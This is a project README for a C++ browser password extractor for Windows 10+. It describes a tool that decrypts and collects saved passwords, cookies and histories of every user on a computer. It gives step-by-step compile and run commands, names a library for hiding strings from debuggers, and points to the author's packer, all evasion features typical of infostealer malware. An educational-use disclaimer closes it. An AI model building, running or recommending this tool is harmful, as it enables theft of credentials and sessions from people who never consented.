# CPP Password Extractor

Fast and lite c++ password extractor
This is a tool that extracts passwords from various web browsers. It is written in C++ and uses the following libraries:

-   [SQLite](https://www.sqlite.org/) - for reading the browser's history and cookie databases
-   [OpenSSL](https://slproweb.com/products/Win32OpenSSL.html) - for decrypting the passwords
-   [WinCrypt](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/) - for decrypting the master key
-   [Hide String](https://github.com/tmih06/Hide-string-from-x86-debugger) - hide string from debuggers

### This only work on window 10+ !!!

## Preview video:
https://github.com/tmih06/Cpp-Password-Extractor/assets/112760114/46cd79c6-de76-4a20-97c2-f4974e66a5ef


# Step-by-step of how to compile

1. Compile the sqlite lib

```shell
cd .\sqlite\
gcc -c -w .\sqlite3.c -o .\sqlite3.dll
```

You can also use `-Os` flag or other optimize flag for the compilation

```shell
gcc -c -w .\sqlite3.c -o .\sqlite3.dll -Os
```

2. Compile the whole program
   Back to the main tree first

```shell
cd..
```

Now include your openssl folder, mine are "D:\OpenSSL-Win64" so it gonna be:

```shell
g++ .\main.cpp -o program -I "D:\OpenSSL-Win64\include" -L "D:\OpenSSL-Win64\lib" ".\sqlite\sqlite3.dll" -static-libgcc -static-libstdc++ -lssl -lcrypto -lcrypt32 -Os
```

By the way this code cannot be compiled statically, you can use [my packer](https://github.com/tmih06/packer-and-unpacker) and pack these dll file

3. Run the program

```shell
program.exe
```

After this the program will create a new folder that contain all the passwords, cookies, browser histories of all user on the computer

# Disclaimer:

This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
